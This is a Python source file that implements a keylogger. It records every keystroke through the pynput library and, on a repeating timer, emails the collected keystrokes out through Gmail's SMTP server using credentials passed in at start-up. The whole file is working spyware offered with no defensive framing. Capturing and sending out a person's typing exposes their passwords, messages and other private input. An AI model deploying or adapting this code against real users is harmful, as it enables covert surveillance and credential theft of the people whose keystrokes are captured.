#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self,time_interval,email,password):            #constructor to initialize variables
        self.log=""
        self.interval=time_interval
        self.email=email
        self.password=password

    def append_to_log(self,string):                             #method to append characters to log file
        self.log=self.log+string

    def process_key_press(self,key):                            #method to record keys
       try:
         current_key=str(key.char)
       except AttributeError:
          if key==key.space:
              current_key=" "    
          else:
              current_key=" "+str(key)+" "
       self.append_to_log(current_key)

    def report(self):                                          #method to report ,thread and send mail
       self.send_mail(self.email,self.password,"\n\n"+self.log)
       print(self.log)
       self.log=""
       timer=threading.Timer(self.interval,self.report)
       timer.start()
    
    def send_mail(self,email,password,message):                #send_mail function
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
       keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
       with keyboard_listener:
          self.report()
          keyboard_listener.join()
